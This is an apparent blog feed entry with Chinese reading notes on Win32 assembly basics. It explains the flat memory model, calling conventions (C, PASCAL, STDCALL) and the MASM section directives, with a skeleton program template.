    <content type="html"><![CDATA[<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>Windows 把每一个 Win32 应用程序放到分开的虚拟地址空间中去运行，也就是说每一个应用程序都拥有其相互独立的 4GB 地址空间，当然这倒不是说它们都拥有 4GB 的物理地址空间，而只是说能够在 4GB 的范围内寻址。操作系统将会在应用程序运行时完成 4GB 的虚拟地址和物理内存地址间的转换。这就要求编写应用程序时必须格守 Windows 的规范，否则极易引起内存的保护模式错误。而过去的 Win16 内存模式下，所有的应用程序都运行于同一个 4GB 地址空间，它们可以彼此”看”到别的程序的内容，这极易导致一个应用程序破坏另一个应用程序甚至是操作系统的数据或代码。  </p><a id="more"></a><p>和 16 位 Windows 下的把代码分成 DATA，CODE 等段的内存模式不同，WIN32 只有一种内存模式，即 FLAT 模式，意思是”平坦”的内存模式，再没有 64K 的段大小限制，所有的 WIN32 的应用程序运行在一个连续、平坦、巨大的 4GB 的空间中。这同时也意味着您无须和段寄存器打交道，您可以用任意的段寄存器寻址任意的地址空间，这对于程序员来说是非常方便的，这也使得用32位汇编语言和用C语言一样方便。 在Win32下编程，有许多重要的规则需要遵守。有一条很重要的是：Windows 在内部频繁使用 ESI，EDI，EBP，EBX 寄存器，而且并不去检测这些寄存器的值是否被更改，这样当您要使用这些寄存器时必须先保存它们的值，待用完后再恢复它们，一个最显著的应用例子就是 Windows 的 CallBack 函数中。   </p><h2 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h2><p>一般的Win32汇编都有下面的程序段，这是一个Win32汇编编程的基础框架，若您现在还不知道这些指令的确切意义的话，没关系， 随后我就会给大家详细解释。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.386 </span><br><span class="line">.MODEL Flat, STDCALL </span><br><span class="line">.DATA </span><br><span class="line">    &lt;Your initialized data&gt; </span><br><span class="line">    ...... </span><br><span class="line">.DATA? </span><br><span class="line">   &lt;Your uninitialized data&gt; </span><br><span class="line">   ...... </span><br><span class="line">.CONST </span><br><span class="line">   &lt;Your constants&gt; </span><br><span class="line">   ...... </span><br><span class="line">.CODE </span><br><span class="line">   &lt;label&gt; </span><br><span class="line">    &lt;Your code&gt; </span><br><span class="line">   ..... </span><br><span class="line">    end &lt;label&gt;</span><br></pre></td></tr></table></figure></p><p>这就是一般Win32汇编编程的基础框架，其中各个关键词的解释说明如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br></pre></td></tr></table></figure><p>这是一个汇编语言伪指令，他告诉编译器我们的程序是使用80386指令集编写的。您还可以使用 .486、.586， 但最安全的还是使用.386。对于每一种CPU有两套几乎功能相同伪指令： .386/.386P、 486/.486P、 586/.586P。 带P的指令标明您的程序中可以用特权级指令。特权级指令是保留给操作系统的，如虚拟设备驱动程序。在大多数时间，您的程序都无须运行在RING0层，故用不带后缀P的伪指令已足够了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.MODEL FLAT，STDCALL</span><br></pre></td></tr></table></figure><p><code>.MODEL</code> 是用来指定内存模式的伪指令，在Win32下，只有一种内存模型，那就是FLAT。 <code>STDCALL</code> 告诉编译器参数的传递约定。参数的传递约定是指参数传达时的顺序(从左到右或从右到左)和由谁恢复堆栈指针(调用者或被调用者)。在Win16下有两种约定：<code>C</code> 和 <code>PASCAL</code>。C 约定规定参数传递顺序是从右到左，即最右边的参数最先压栈，由调用者恢复堆栈指针。</p><p>例如：为调用函数 <code>foo ( int first_param， int second_param， int third_param )</code>； 按C约定的汇编代码应该是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">push [third_param]</span><br><span class="line">push [second_param]</span><br><span class="line">push [first_param]</span><br><span class="line">call foo</span><br><span class="line">add esp， 3 * 4 ;调用者自己恢复堆栈指针</span><br></pre></td></tr></table></figure><p><code>PASCAL</code>约定和<code>C</code>约定正好相反，它规定参数是从左向右传递，由被调用者恢复堆栈。Win16采用了<code>PASCAL</code>约定， 因为<code>PASCAL</code>约定产生的代码量要小。当不知道参数的个数时，<code>C</code>约定特别有用。如在函数<code>wsprintf ()</code> 中， <code>wsprintf</code>预先并不知道要传递几个参数，所以它不知道如何恢复堆栈。<code>STDCALL</code>是<code>C</code>约定和<code>PASCAL</code>约定的混合体，它规定参数的传递是从右到左，恢复堆栈的工作交由被调用者。Win32只用<code>STDCALL</code>约定，但除了一个特例，即：<code>wsprintf</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.DATA </span><br><span class="line">.DATA? </span><br><span class="line">.CONST </span><br><span class="line">.CODE</span><br></pre></td></tr></table></figure><p>上面的四个伪指令是”分段”(SECTION)伪指令。我们上面刚讲过Win32下没有”段”(SEGMENT)的概念，但是您可以把您的程序分成不同的”分段”， 一个”分段”的开始即是上一个”分段”的结束。WIN32中只有两种性质的”分段”：<code>DATA</code>和<code>CODE</code>。</p><p>其中DATA”分段”又分为三种：</p><ul><li><code>.DATA</code> 其中包括已初始化的数据。</li><li><code>.DATA?</code> 其中包括未初始化的数据。比如有时您仅想预先分配一些内存但并不想指定初始值。使用未初始化的数据的优点是它不占据可执行文件的大小，如：若您要在 <code>.DATA?</code> 段中分配10,000字节的空间，您的可执行文件的大小无须增加10,000字节，而仅仅是要告诉编译器在装载可执行文件时分配所需字节。</li><li><code>.CONST</code> 其中包括常量定义。这些常量在程序运行过程中是不能更改的。 应用程序并不需要以上所有的三个”分段”， 可以根据需要进行定义。 </li><li><code>.CODE</code> 这是代码”分段”。 <blockquote><p>实际上，分段并不是象在 Dos 下一样，为不同的段分别指出不同的段寄存器，因为 Windows 下只有一个 4GB 的段，Windows 程序中的分段表现在当程序装载时，赋予不同的分段不同的属性，比如说当你的程序加载时，对于 Ring3 程序来说，.code 段是不可写的，而 .data 段是可写的，如果你尝试象在 Dos 下一样写自己的代码部分，你会得到一个蓝屏错误</p></blockquote></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;label&gt; </span><br><span class="line">end &lt;label&gt;</span><br></pre></td></tr></table></figure><p>是用来唯一标识您的代码范围的标签， 两个标签必须相同，应用程序的所有可执行代码必须在两个标签之间。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;背景知识&quot;&gt;&lt;a href=&quot;#背景知识&quot; class=&quot;headerlink&quot; title=&quot;背景知识&quot;&gt;&lt;/a&gt;背景知识&lt;/h2&gt;&lt;p&gt;Windows 把每一个 Win32 应用程序放到分开的虚拟地址空间中去运行，也就是说每一个应用程序都拥有其相互独立的 4GB 地址空间，当然这倒不是说它们都拥有 4GB 的物理地址空间，而只是说能够在 4GB 的范围内寻址。操作系统将会在应用程序运行时完成 4GB 的虚拟地址和物理内存地址间的转换。这就要求编写应用程序时必须格守 Windows 的规范，否则极易引起内存的保护模式错误。而过去的 Win16 内存模式下，所有的应用程序都运行于同一个 4GB 地址空间，它们可以彼此”看”到别的程序的内容，这极易导致一个应用程序破坏另一个应用程序甚至是操作系统的数据或代码。  &lt;/p&gt;
    
    </summary>
    
      <category term="汇编(ASM)" scheme="http://hacktech.cn/categories/%E6%B1%87%E7%BC%96-ASM/"/>
    
    
      <category term="ASM" scheme="http://hacktech.cn/tags/ASM/"/>
    
      <category term="读书笔记" scheme="http://hacktech.cn/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
      <category term="Windows" scheme="http://hacktech.cn/tags/Windows/"/>
    
  </entry>
  
</feed>
